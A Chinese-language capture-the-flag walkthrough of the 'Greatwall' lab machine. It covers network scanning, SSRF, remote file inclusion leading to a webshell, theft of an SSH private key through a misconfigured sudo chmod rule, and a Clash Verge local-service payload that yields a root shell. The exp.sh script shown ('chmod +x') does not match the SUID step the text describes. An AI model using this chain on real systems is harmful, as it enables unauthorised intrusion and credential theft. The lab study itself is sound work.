# Greatwall

扫描发现靶机 IP

```bash
arp-scan -l

# -l 自动探测你当前计算机所在的本地网络的 IP 地址范围和子网掩码，然后对这个整个网段进行扫描
```

![](https://pic1.imgdb.cn/item/69028fe23203f7be00b29d5d.png)

使用 nmap 扫描靶机

```bash
nmap -sS -sV -O -p- 192.168.41.199

# -sS TCP SYN 扫描
# -sV 版本探测
# -O 操作系统探测
# -p- 扫描全端口
```

![](https://pic1.imgdb.cn/item/690291313203f7be00b2a029.png)

只有 22 端口以及 80 端口，开放的服务是 SSH 以及 Apache

第一种渗透思路是爆破 SSH，但是机会渺茫

第二种是访问对应 Web 从而寻找机会

![](https://pic1.imgdb.cn/item/690291d03203f7be00b2a1a1.png)

扫描后台无果

```
dirb http://192.168.41.199/
```

![](https://pic1.imgdb.cn/item/690292083203f7be00b2a218.png)

只能从网站功能入手了，提示 `https://` ，输入百度链接无果，但是注意到 URL 参数变化

![](https://pic1.imgdb.cn/item/690292b23203f7be00b2a367.png)

## Hello World SSRF

看到 `https/http` 应该要想到可能存在哪些漏洞，如 URL 重定向、SSRF

换成伪协议证实存在漏洞

![](https://pic1.imgdb.cn/item/6902930e3203f7be00b2a3d4.png)

## Hello World RFI

因为我们的目标是拿到 root 权限，所以要想怎么 RCE，常规 SSRF 造成 RCE 是因为对方有 Redis 未授权

显然这个靶标的 `/etc/passwd` 并没有 Redis 用户，并且网站是用 PHP 写的（参考上面后台扫描结果）

那么这里的考点应该是和 PHP 相关的漏洞，仔细思考之前的 TOP10，应该能想到可以 RCE 的漏洞有 SQL 注入、RCE、文件包含

这个页面中肯定不存在 SQL 注入以及 RCE 的，那么只能从文件包含入手

文件包含分为远程和本地两种，本地就不说了，我们不知道它网站上有什么（加上之前也没扫出来其他 PHP 文件）

那么只剩下远程包含了，准备 PHP 文件

```php
<?php phpinfo();?>
```

![](https://pic1.imgdb.cn/item/690295aa3203f7be00b2a6e6.png)

使用 Python 开启一个简易的 HTTP 服务，最好在 80 端口（踩坑点：别的端口没反应是因为流量不出站设置了 `iptables`，自行了解）

```
python -m http.server 80
```

![](https://pic1.imgdb.cn/item/6902978e3203f7be00b2a93e.png)

包含成功！！！

![](https://pic1.imgdb.cn/item/690299f23203f7be00b2ac1e.png)

修改为一句话木马，测试也可以

![](https://pic1.imgdb.cn/item/69029da23203f7be00b2b010.png)

使用蚁剑连接

![](https://pic1.imgdb.cn/item/69029e0d3203f7be00b2b07f.png)

## Sudoders 配置不当

我们发现当前用户 `www-data` 可以通过 `sudo` 以 `wall` 用户的身份执行 `chmod` 命令

![](https://pic1.imgdb.cn/item/69029e4c3203f7be00b2b0c3.png)

我们可以利用这个权限来修改 `wall` 用户家目录的权限，从而读取其 SSH 私钥

```bash
sudo -u wall chmod 777 /home/wall/
```

![](https://pic1.imgdb.cn/item/69029ec33203f7be00b2b145.png)

拿到第一个 flag

![](https://pic1.imgdb.cn/item/69029f023203f7be00b2b18c.png)

## 窃取 SSH 私钥提权

修改 `.ssh` 目录权限

```bash
sudo -u wall chmod 777 .ssh
```

![](https://pic1.imgdb.cn/item/69029f803203f7be00b2b221.png)

修改权限并读取 `id_rsa` 密钥

```bash
sudo -u wall chmod 700 id_rsa
```

![](https://pic1.imgdb.cn/item/69029fe93203f7be00b2b291.png)

将复制的私钥保存在 Kali 攻击机本地（例如 `/tmp/id_rsa`），赋予 `600` 权限

![](https://pic1.imgdb.cn/item/6902a6a93203f7be00b2b9c4.png)

恢复靶机的所有权限

```bash
sudo -u wall chmod 700 id_rsa
sudo -u wall chmod 700 .ssh
sudo -u wall chmod 700 /home/wall/
```

然后使用该私钥以 `wall` 用户身份 SSH 登录目标主机

```bash
ssh -i id_rsa wall@192.168.41.199
```

![](https://pic1.imgdb.cn/item/6902a79f3203f7be00b2ba20.png)

## Clash Verge 提权

检查 wall 用户权限发现可以使用 `start clash-verge-service`

![](https://pic1.imgdb.cn/item/6902a8253203f7be00b2ba2b.png)

搜索历史漏洞找到一个关于提权的 POC

[Clash Verge客户端1-Click RCE漏洞](https://zyen84kyvn.feishu.cn/docx/PXu6dsXf0onNdRxs8LfceNXjncb)

在 `/tmp` 目录下创建一个脚本 `exp.sh`，其功能是为 `/bin/bash` 添加 SUID 权限位，并赋予其执行权限

```bash
#!/bin/bash
chmod +x /bin/bash
```

![](https://pic1.imgdb.cn/item/6902aa4d3203f7be00b2ba6c.png)

启动 Clash-Verge 服务

```bash
sudo /usr/bin/systemctl start clash-verge-service
```

根据文章内容构造 Payload

```
curl -X POST 'http://127.0.0.1:33211/start_clash' -H "Content-Type: application/json" -d '{"bin_path": "/tmp/exp.sh", "config_dir": "", "config_file": "", "log_file": "/dev/null"}'
```

执行后检查权限可以看到已经添加了 SUID 位，此时执行 `bash -p` 即可获得一个 `euid` 为 `root` 的 Shell

![](https://pic1.imgdb.cn/item/6902ac3f3203f7be00b2baae.png)

成功拿到 root 用户 flag

![](https://pic1.imgdb.cn/item/6902acef3203f7be00b2bac7.png)